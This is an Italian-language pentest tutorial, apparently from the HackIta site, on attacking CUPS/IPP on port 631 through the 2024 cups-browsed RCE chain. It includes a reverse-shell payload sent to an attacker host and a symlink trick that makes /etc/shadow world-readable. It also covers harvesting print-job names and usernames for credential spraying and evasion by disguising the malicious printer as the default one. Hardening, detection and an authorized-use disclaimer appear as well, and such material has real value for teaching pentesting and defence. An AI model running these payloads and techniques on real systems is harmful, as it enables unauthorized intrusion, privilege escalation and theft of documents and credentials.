---
title: >-
  Porta 631 IPP/CUPS: RCE chain, cups-browsed e compromissione dei print server
  Linux.
slug: porta-631-ipp-cups
description: >-
  Scopri cos’è la porta 631 IPP/CUPS, come funziona l’Internet Printing Protocol
  su TCP e UDP 631 e perché la chain di vulnerabilità del 2024 legata a
  cups-browsed ha riportato al centro RCE, discovery di stampanti e sicurezza
  dei print server Linux.
image: /porta-631-ipp-cups.webp
draft: false
date: 2026-04-06T00:00:00.000Z
categories:
  - networking
subcategories:
  - porte
tags:
  - cups-browsed
  - ipp-rce
---

> **Executive Summary** — La porta 631 espone IPP (Internet Printing Protocol) e l'interfaccia web di CUPS, il sistema di stampa standard su Linux e macOS. A settembre 2024, una catena di 4 CVE (CVE-2024-47176/47076/47175/47177) ha rivelato una RCE unauthenticated su qualsiasi sistema Linux con cups-browsed attivo. Un singolo pacchetto UDP alla porta 631 innesca la catena: il target si connette al server dell'attacker, riceve una stampante malevola, e quando qualcuno stampa su di essa viene eseguito codice arbitrario. Questa guida copre enumerazione, la RCE chain, privilege escalation e hardening.

```id="p9s4jd"
TL;DR

- CUPS cups-browsed ascolta su UDP 631 su tutte le interfacce e accetta stampanti da qualsiasi sorgente — senza autenticazione
- La RCE chain di settembre 2024 (4 CVE) raggiunge esecuzione di codice quando un utente stampa su una stampante malevola iniettata
- L'interfaccia web CUPS su TCP 631 espone stampanti, job di stampa (con contenuto sensibile) e configurazione del sistema

```

Porta 631 IPP è il canale su cui opera CUPS (Common Unix Printing System), il sistema di stampa standard per Linux, macOS e molti sistemi Unix. La porta 631 vulnerabilità più devastante è la RCE chain di settembre 2024: cups-browsed accetta stampanti malevole via UDP senza autenticazione, iniettando codice che viene eseguito alla prima operazione di stampa. L'enumerazione porta 631 rivela stampanti configurate, job di stampa (potenzialmente con documenti sensibili), versione CUPS e configurazione del sistema. Nel CUPS pentest, la catena CVE-2024-47176 permette RCE su praticamente qualsiasi Linux con cups-browsed attivo — colpendo centinaia di migliaia di sistemi. Nella kill chain si posiziona come initial access (RCE unauthenticated) e information disclosure (job di stampa, credenziali).

## 1. Anatomia Tecnica della Porta 631

La porta 631 è registrata IANA come `ipp` su TCP e UDP. IPP (RFC 8011) è il protocollo standard per la gestione delle stampanti di rete. CUPS lo implementa e aggiunge un'interfaccia web di amministrazione.

I servizi sulla porta 631:

1. **[TCP](https://hackita.it/articoli/tcp) 631**: server web CUPS (interfaccia admin + IPP protocol)
2. **[UDP](https://hackita.it/articoli/udp) 631**: cups-browsed (discovery automatica di stampanti sulla rete)

Il flusso della RCE chain (settembre 2024):

1. `cups-browsed` ascolta su UDP 631 su `INADDR_ANY` (tutte le interfacce)
2. L'attacker invia un pacchetto UDP che annuncia una "stampante" con URL controllato dall'attacker
3. `cups-browsed` si connette all'URL dell'attacker per ottenere gli attributi IPP della stampante
4. Gli attributi contengono direttive PPD malevole (via `FoomaticRIPCommandLine`)
5. Una stampante malevola appare nel sistema del target
6. Quando un utente stampa su di essa, il comando viene eseguito come utente `lp`

Le 4 CVE della catena:

* **CVE-2024-47176**: cups-browsed accetta pacchetti da qualsiasi sorgente su UDP 631
* **CVE-2024-47076**: libcupsfilters non valida gli attributi IPP ricevuti
* **CVE-2024-47175**: libppd non sanitizza gli attributi quando scrive il file PPD
* **CVE-2024-47177**: cups-filters esegue `FoomaticRIPCommandLine` come comando shell (CVSS 9.0)

```
Misconfig: cups-browsed attivo su tutte le interfacce
Impatto: RCE unauthenticated — un pacchetto UDP inietta una stampante malevola
Come si verifica: sudo ss -ulnp | grep 631 — se in LISTEN su 0.0.0.0, è vulnerabile
```

```
Misconfig: Interfaccia web CUPS accessibile da remoto
Impatto: enumerazione completa di stampanti, job, configurazione e versione OS
Come si verifica: curl http://[target]:631/ — se risponde, è accessibile
```

```
Misconfig: Job di stampa non cancellati dalla coda
Impatto: accesso a documenti sensibili nei job completati
Come si verifica: curl http://[target]:631/jobs — lista dei job con dettagli
```

## 2. Enumerazione Base

### Comando 1: Nmap TCP

```bash
nmap -sV -sC -p 631 10.10.10.30
```

**Output atteso:**

```
PORT    STATE SERVICE VERSION
631/tcp open  ipp     CUPS 2.4
| http-title: Home - CUPS 2.4.7
|_http-server-header: CUPS/2.4 IPP/2.1
| http-robots.txt: 1 disallowed entry
|_/admin
```

**Parametri:**

* `-sV`: versione CUPS esatta (fondamentale per la chain CVE)
* `-sC`: script http-title, robots.txt — rivela la pagina admin
* `-p 631`: porta IPP

### Comando 2: Nmap UDP (cups-browsed)

```bash
nmap -sU -p 631 10.10.10.30
```

**Output atteso:**

```
PORT    STATE         SERVICE
631/udp open|filtered ipp
```

**Cosa ci dice questo output:** UDP 631 `open|filtered` indica che cups-browsed potrebbe essere in ascolto — il target è potenzialmente vulnerabile alla RCE chain. TCP 631 rivela CUPS 2.4.7 con interfaccia web accessibile.

## 3. Enumerazione Avanzata

### Interfaccia web CUPS

```bash
curl -s http://10.10.10.30:631/
curl -s http://10.10.10.30:631/printers
curl -s http://10.10.10.30:631/jobs
```

**Output (/printers):**

```
<title>Printers - CUPS 2.4.7</title>
...
HP_LaserJet_Pro - idle, accepting jobs
  Location: Piano 2 Ufficio IT
  Model: HP LaserJet Pro MFP M428fdw
  URI: ipp://192.168.1.100/ipp/print
...
Canon_IR2520 - idle
  Location: Reception
  Model: Canon imageRUNNER 2520
```

**Lettura dell'output:** due stampanti configurate con posizione fisica (Piano 2, Reception), modello e URI di connessione. Queste informazioni rivelano la topologia fisica dell'ufficio e IP delle stampanti di rete. Per correlare con la [guida alla porta 515 LPD](https://hackita.it/articoli/porta-515-lpd), verifica se le stesse stampanti espongono anche il protocollo legacy.

### Verifica cups-browsed attivo

```bash
# Da remoto, invia un pacchetto di test UDP alla 631
echo -ne "\x00\x03" | nc -u 10.10.10.30 631
```

**Output (cups-browsed attivo — tenta connessione verso di te):**

```
# Nel tuo tcpdump/wireshark: il target tenta di connettersi al tuo IP sulla porta specificata
```

**Output (cups-browsed non attivo):**

```
(nessuna risposta, nessuna connessione in uscita dal target)
```

### Enumerazione con ipptool

```bash
ipptool -tv http://10.10.10.30:631/printers/HP_LaserJet_Pro get-printer-attributes.test
```

**Output:**

```
printer-name = HP_LaserJet_Pro
printer-state = idle
printer-state-reasons = none
cups-version = 2.4.7
system-default-printer = HP_LaserJet_Pro
document-format-supported = application/pdf, application/postscript, image/jpeg
```

**Lettura dell'output:** versione CUPS esatta, stato della stampante e formati supportati. La versione 2.4.7 è vulnerabile alla chain se cups-browsed è attivo. Per un'analisi SNMP correlata sulle stampanti fisiche, consulta la [guida alla porta 161 SNMP](https://hackita.it/articoli/snmp).

## 4. Tecniche Offensive

**CUPS RCE chain (CVE-2024-47176/47076/47175/47177)**

Contesto: target Linux con cups-browsed attivo su UDP 631. CUPS ≤ 2.4.x con cups-browsed ≤ 2.0.1.

```bash
# Sul tuo host: avvia il server IPP malevolo
python3 cups_rce.py --target 10.10.10.30 --attacker 10.10.10.200 \
  --command "bash -c 'bash -i >& /dev/tcp/10.10.10.200/9001 0>&1'"
```

**Output (lato attacker):**

```
[*] Sending malicious printer advertisement to 10.10.10.30:631/udp
[*] Waiting for cups-browsed to connect back...
[*] cups-browsed connected! Serving malicious IPP attributes...
[*] Malicious printer 'HACKED_Printer' injected on target
[*] Waiting for someone to print... (requires user interaction)
```

**Output (quando qualcuno stampa):**

```
# Sul tuo listener netcat (porta 9001):
$ nc -lvnp 9001
Connection from 10.10.10.30
lp@target:~$
```

**Cosa fai dopo:** hai una shell come utente `lp` (l'utente del sistema di stampa). Da qui puoi leggere i job di stampa in `/var/spool/cups/`, cercare credenziali nei documenti stampati, e tentare privilege escalation. Per l'escalation da `lp` a root, consulta le [tecniche di privilege escalation Linux](https://hackita.it/articoli/privilege-escalation).

**Nota critica:** questa catena richiede che un utente stampi sulla stampante malevola. In un engagement reale, puoi rinominare la stampante malevola con il nome della stampante predefinita per aumentare le probabilità.

**Information disclosure dalla web interface**

Contesto: interfaccia web CUPS accessibile. Vuoi estrarre informazioni sensibili.

```bash
# Lista job di stampa (possono contenere nomi file sensibili)
curl -s http://10.10.10.30:631/jobs?which_jobs=completed
```

**Output:**

```
Budget_Q4_2025.pdf - completed - j.smith
HR_Salary_Review.xlsx - completed - hr_admin  
VPN_Credentials.txt - completed - it_admin
```

**Cosa fai dopo:** i nomi dei file rivelano informazioni sensibili. I job completati possono ancora essere accessibili in `/var/spool/cups/` se non cancellati. I nomi utente (`j.smith`, `hr_admin`, `it_admin`) alimentano la lista per il credential spray.

**CVE-2024-35235 — Privilege escalation su CUPS**

Contesto: hai accesso locale come utente `lp` (dalla RCE chain o altro). CUPS ≤ 2.4.8 su Ubuntu.

```bash
# Crea symlink verso un file target
ln -sf /etc/shadow /tmp/cups_exploit
# Configura CUPS Listen directive per puntare al symlink
# cupsd (root) eseguirà chmod 666 sul target del symlink
```

**Output (successo):**

```
-rw-rw-rw- 1 root root 1234 /etc/shadow
# Shadow leggibile da tutti — estrai hash
cat /etc/shadow
```

**Cosa fai dopo:** hash delle password di sistema accessibili. Cracka con hashcat/john. Da `lp` a root via file permission abuse.

## 5. Scenari Pratici di Pentest

### Scenario 1: Linux server con cups-browsed attivo

**Situazione:** server Ubuntu/Debian con CUPS installato di default. cups-browsed in ascolto. Engagement interno.

**Step 1:**

```bash
nmap -sV -p 631 10.10.10.0/24 --open
nmap -sU -p 631 10.10.10.0/24
```

**Output atteso:**

```
10.10.10.30 - 631/tcp open ipp CUPS 2.4.7
10.10.10.30 - 631/udp open|filtered ipp
```

**Step 2:**

```bash
python3 cups_rce.py --target 10.10.10.30 --attacker 10.10.10.200 --command "id"
```

**Se fallisce:**

* Causa probabile: cups-browsed non attivo (`systemctl status cups-browsed` → inactive)
* Fix: concentrati sull'interfaccia web TCP 631 per information disclosure

**Tempo stimato:** 10-30 minuti (dipende dall'interazione utente per la stampa)

### Scenario 2: Print server enterprise

**Situazione:** print server Linux centralizzato che gestisce le stampanti di tutto l'ufficio. Accessibile dalla rete interna.

**Step 1:**

```bash
curl -s http://10.10.10.30:631/printers | grep -i "printer-name\|location\|model"
```

**Step 2:**

```bash
curl -s http://10.10.10.30:631/jobs?which_jobs=completed
```

**Se fallisce:**

* Causa probabile: interfaccia web limitata a localhost (`Listen localhost:631` in cupsd.conf)
* Fix: se hai accesso SSH al server, accedi via port forward: `ssh -L 631:localhost:631 user@target`

**Tempo stimato:** 5-15 minuti

### Scenario 3: macOS workstation con CUPS

**Situazione:** macOS usa CUPS nativamente. La porta 631 è spesso aperta.

**Step 1:**

```bash
nmap -sV -p 631 10.10.10.0/24 --open
# macOS risponde con "CUPS/2.x" nel banner
```

**Step 2:**

```bash
curl -s http://10.10.10.40:631/printers
```

**Se fallisce:**

* Causa probabile: macOS restringe CUPS a localhost di default nelle versioni recenti
* Fix: verifica se la macchina è vulnerabile alla chain via UDP 631

**Tempo stimato:** 5-10 minuti

## 6. Attack Chain Completa

| Fase       | Tool           | Comando chiave                              | Output/Risultato       |
| ---------- | -------------- | ------------------------------------------- | ---------------------- |
| Recon TCP  | nmap           | `nmap -sV -p 631 [subnet]`                  | Versione CUPS          |
| Recon UDP  | nmap           | `nmap -sU -p 631 [subnet]`                  | cups-browsed attivo    |
| Web Enum   | curl           | `curl http://[target]:631/printers`         | Stampanti, job, utenti |
| RCE Chain  | cups\_rce.py   | `cups_rce.py --target [IP] --command [cmd]` | Shell come `lp`        |
| Priv Esc   | CVE-2024-35235 | Symlink exploit su CUPS ≤ 2.4.8             | Root                   |
| Data Exfil | cat            | `cat /var/spool/cups/*`                     | Documenti stampati     |

**Timeline stimata:** 10-60 minuti (RCE chain richiede interazione utente per la stampa).

**Ruolo della porta 631:** è il sistema di stampa di ogni Linux. La RCE chain del 2024 ha dimostrato che un singolo pacchetto UDP può compromettere un server intero.

## 7. Detection & Evasion

### Cosa monitora il Blue Team

* **Snort/Suricata**: rule SID 64051 (Cisco Talos) per `FoomaticRIPCommandLine` nelle risposte IPP
* **Log CUPS**: `/var/log/cups/error_log` per stampanti aggiunte automaticamente
* **Firewall**: connessioni in uscita dalla porta 631 verso IP esterni

### Tecniche di Evasion

```
Tecnica: Injection via mDNS/DNS-SD invece di UDP diretto
Come: se UDP 631 è filtrato, annuncia la stampante malevola via mDNS sulla rete locale
Riduzione rumore: mDNS è traffico normale per printer discovery — meno sospetto
```

```
Tecnica: Nome stampante plausibile
Come: rinomina la stampante malevola come la stampante predefinita (es: "HP_LaserJet_Pro")
Riduzione rumore: un utente stampa sulla "sua" stampante senza sospetti
```

### Cleanup

* Rimuovi la stampante malevola: `lpadmin -x HACKED_Printer`
* Cancella job di stampa malevoli: `cancel -a`
* I file PPD malevoli sono in `/etc/cups/ppd/` — rimuovili
* cups-browsed si normalizza automaticamente dopo lo stop dell'attacco

## 8. Toolchain e Confronto

| Aspetto    | IPP/CUPS (631)    | LPD (515)      | JetDirect (9100) |
| ---------- | ----------------- | -------------- | ---------------- |
| Porta      | 631/TCP+UDP       | 515/TCP        | 9100/TCP         |
| Protocollo | IPP (HTTP-based)  | LPD (BSD)      | PJL/PCL raw      |
| Auth       | HTTP Basic/Digest | Nessuna        | Nessuna          |
| TLS        | IPPS supportato   | No             | No               |
| Tool       | ipptool, curl     | lpc, lpq       | PRET             |
| RCE chain  | CVE-2024-47176+   | Path traversal | PJL filesystem   |

## 9. Troubleshooting

| Errore / Sintomo              | Causa                                  | Fix                                                                 |
| ----------------------------- | -------------------------------------- | ------------------------------------------------------------------- |
| TCP 631 `Connection refused`  | CUPS non installato o fermo            | `systemctl status cups` — potrebbe non essere installato            |
| Web interface `403 Forbidden` | CUPS limitato a localhost              | SSH tunnel: `ssh -L 631:localhost:631 user@target`                  |
| RCE chain non funziona        | cups-browsed non attivo                | `systemctl status cups-browsed` — se inactive, no RCE chain via UDP |
| Nessun job in /jobs           | Job vengono cancellati automaticamente | Verifica `PreserveJobHistory` in cupsd.conf                         |
| Stampante malevola non appare | cups-browsed filtra per network        | Verifica di essere sulla stessa subnet del target                   |

## 10. FAQ

**D: Come funziona la RCE chain di CUPS del 2024?**

R: cups-browsed ascolta su UDP 631 e accetta annunci di stampanti da qualsiasi sorgente. L'attacker annuncia una stampante con attributi IPP malevoli che iniettano un comando shell nel file PPD. Quando un utente stampa su quella stampante, il comando viene eseguito come utente `lp`.

**D: Porta 631 è TCP o UDP?**

R: Entrambi. TCP 631 è l'interfaccia web CUPS e il protocollo IPP. UDP 631 è cups-browsed per la discovery automatica delle stampanti. La RCE chain usa UDP per l'injection iniziale.

**D: La RCE chain funziona senza interazione utente?**

R: No. L'injection della stampante malevola è automatica (basta un pacchetto UDP), ma il codice viene eseguito solo quando qualcuno stampa su quella stampante. In un ambiente con molti utenti, è questione di tempo.

**D: Che differenza c'è tra IPP (631) e LPD (515)?**

R: IPP è il protocollo moderno basato su HTTP con supporto TLS e autenticazione. LPD è il protocollo legacy BSD (1988) senza sicurezza. CUPS supporta entrambi ma IPP è lo standard. La superficie di attacco è diversa: IPP ha la RCE chain via cups-browsed, LPD ha path traversal classici.

**D: Come proteggere CUPS sulla porta 631?**

R: Disabilita cups-browsed se non necessario: `systemctl stop cups-browsed && systemctl disable cups-browsed`. Blocca UDP 631 nel firewall. Limita l'interfaccia web a localhost. Aggiorna CUPS alla versione più recente.

## 11. Cheat Sheet Finale

| Azione          | Comando                                                                       | Note                  |
| --------------- | ----------------------------------------------------------------------------- | --------------------- |
| Scan TCP        | `nmap -sV -p 631 [subnet] --open`                                             | Web interface CUPS    |
| Scan UDP        | `nmap -sU -p 631 [subnet]`                                                    | cups-browsed          |
| Web enum        | `curl http://[target]:631/printers`                                           | Stampanti e modelli   |
| Job enum        | `curl http://[target]:631/jobs?which_jobs=completed`                          | Documenti stampati    |
| Versione        | `curl -s http://[target]:631/ \| grep "CUPS"`                                 | Per verifica CVE      |
| RCE chain       | `cups_rce.py --target [IP] --command [cmd]`                                   | Richiede print        |
| ipptool         | `ipptool -tv http://[target]:631/printers/[name] get-printer-attributes.test` | Dettagli printer      |
| Disable browsed | `sudo systemctl stop cups-browsed`                                            | Mitigazione immediata |
| Firewall UDP    | `sudo ufw deny 631/udp`                                                       | Blocca injection      |

### Perché Porta 631 è rilevante nel 2026

CUPS è installato di default su quasi ogni distribuzione Linux e su tutti i macOS. La RCE chain di settembre 2024 ha colpito centinaia di migliaia di sistemi — Evilsocket ha ricevuto 200.000-300.000 connessioni simultanee durante il test di disclosure. cups-browsed è ancora attivo di default su molte distribuzioni. CVE-2024-35235 aggiunge un vettore di privilege escalation locale. La porta 631 è una delle più sottovalutate nello scan di un pentest interno.

### Hardening e Mitigazione

* Disabilita cups-browsed: `systemctl stop cups-browsed && systemctl disable cups-browsed`
* Blocca UDP 631: `ufw deny 631/udp`
* Configura `BrowseRemoteProtocols none` in `/etc/cups/cups-browsed.conf`
* Limita interfaccia web: `Listen localhost:631` in `/etc/cups/cupsd.conf`
* Aggiorna CUPS e cups-browsed alle versioni patchate

### OPSEC per il Red Team

L'injection UDP è un singolo pacchetto — basso profilo. La connessione di ritorno di cups-browsed verso il tuo server IPP è più visibile (traffico in uscita anomalo). Il trigger richiede che un utente stampi — non hai controllo sui tempi. Per aumentare le probabilità: inietta la stampante con il nome della stampante predefinita del sistema. L'esecuzione avviene come `lp`, un utente con privilegi limitati — serve escalation per root.

***

Tutti i comandi e le tecniche sono destinati esclusivamente ad ambienti autorizzati: penetration test con contratto, lab, CTF. Riferimento: RFC 8011 (IPP), CVE-2024-47176, CVE-2024-47076, CVE-2024-47175, CVE-2024-47177,  CVE-2024-35235. Approfondimento: [https://www.speedguide.net/port.php?port=631](https://www.speedguide.net/port.php?port=631)

> Vuoi supportare HackIta? Visita [hackita.it/supporto](https://hackita.it/supporto) per donazioni. Per penetration test professionali e formazione 1:1, scopri [hackita.it/servizi](https://hackita.it/servizi).
